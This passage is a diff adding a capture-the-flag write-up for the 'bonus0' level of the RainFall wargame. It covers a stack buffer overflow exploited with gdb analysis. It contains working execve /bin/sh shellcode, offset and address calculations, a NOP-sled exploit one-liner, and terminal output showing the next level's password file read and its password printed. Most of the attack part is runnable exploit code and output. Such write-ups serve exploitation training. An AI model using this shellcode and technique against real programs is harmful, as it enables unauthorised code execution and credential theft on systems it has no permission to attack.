@@ -1,0 +1,72 @@
+shellcode (21 bytes)
+https://shell-storm.org/shellcode/files/shellcode-517.html
+\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
+
+> (gdb) r
+> Starting program: /home/user/bonus0/bonus0
+>  -
+> AAAAAAAAAAAAAAAAAAAA
+>  -
+> BBBBCCCCDDDDEEEEFFFF
+> AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF��� BBBBCCCCDDDDEEEEFFFF���
+>
+> Program received signal SIGSEGV, Segmentation fault.
+> 0x45444444 in ?? ()
+
+This means we can overwrite EIP after this sequence:
+> BBBBCCCCD # 9 characters
+
+but we need to fill the remaining bytes to a total of 20 bytes
+because the 2 buffers in the function `pp` are continous
+
+Now that we know how to overwrite EIP, we'll exploit the buffer inside `p`'s functions
+This buffer is at least of size 4096. The call to the `read` function reads 4096 bytes.
+What we want is to write at least 20 bytes to fill the first buffer in `pp`.
+Then we want to write a shellcode into that buffer.
+
+First we need to find the address of this 4096 bytes buffer.
+
+> (gdb) disas p
+> Dump of assembler code for function p:
+> ...
+>    0x080484d0 <+28>:    lea    eax,[ebp-0x1008] <- this is what interests us
+
+Let's set a breakpoint
+> (gdb) b p
+> Breakpoint 1 at 0x80484bd
+> (gdb) r
+> Starting program: /home/user/bonus0/bonus0
+>
+> Breakpoint 1, 0x080484bd in p ()
+> (gdb) p $ebp-0x1008
+> $1 = (void *) 0xbfffe580 <- buffer's address
+
+In order to store our shellcode without overwriting it, we need to store it a
+little bit farther than 20 bytes in order to write 20 bytes the second time
+there is the user prompt.
+
+```
+(python -c 'print "A" * 20 + NOP sled + shellcode' # first input;\
+python -c 'print "B" * 9 + (buffer address+offset) + "C" * 7' # 20 bytes;\
+cat # in order to keep stdin open
+)
+```
+
+The NOP sled and offset are necessary as the execution of our program without gdb
+will provide not exactly the same addresses. To optimize our chance to access our shellcode
+we will leverage the use of a NOP sled.
+
+We will use 100 bytes of NOP sled and add 100 to our base address we want to jump to.
+`0xbfffe580 + 0x64 (100) = 0xbfffe5e4`
+
+exploit
+(python -c 'print "A" * 20 + "\x90" * 100 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"';\
+python -c 'print "B" * 9 + "\xbf\xff\xe5\xe4"[::-1] + "C" * 7';\
+cat) | ./bonus0
+
+> bonus0@RainFall:~$ (python -c 'print "A" * 20 + "\x90" * 100 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"';python -c 'print "B" * 9 + "\xbf\xff\xe5\xe4"[::-1] + "C" * 7';cat) | ./bonus0
+>  -
+>  -
+> AAAAAAAAAAAAAAAAAAAABBBBBBBBB����CCCCCCC��� BBBBBBBBB����CCCCCCC���
+> cat /home/user/bonus1/.pass
+> cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
